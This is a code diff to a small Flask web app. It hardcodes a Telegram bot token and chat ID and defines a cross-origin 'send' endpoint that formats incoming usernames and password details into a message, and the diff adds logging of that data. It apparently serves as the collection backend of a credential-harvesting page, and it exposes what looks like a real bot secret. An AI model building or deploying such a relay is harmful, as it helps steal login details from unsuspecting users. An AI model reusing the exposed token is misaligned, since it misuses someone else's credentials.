@@ -6,8 +6,10 @@ import os
 app = Flask(__name__)
 CORS(app)
 
+# Փոխիր միայն սրանք
 BOT_TOKEN = "8941028344:AAEYsRq2psDO5o5CCxYIM7Q_z9ryE9s6PZo"
 CHAT_ID = "1584744130"
+
 
 
 @app.route("/")
@@ -20,7 +22,9 @@ def send():
 
     data = request.json
 
-message = f"""
+    print(data)
+
+    message = f"""
 New message
 
 Username: {data.get('username')}
@@ -45,7 +49,9 @@ Password length: {data.get('passwordLength')}
 
 
 if __name__ == "__main__":
+
     port = int(os.environ.get("PORT", 5000))
+
     app.run(
         host="0.0.0.0",
         port=port
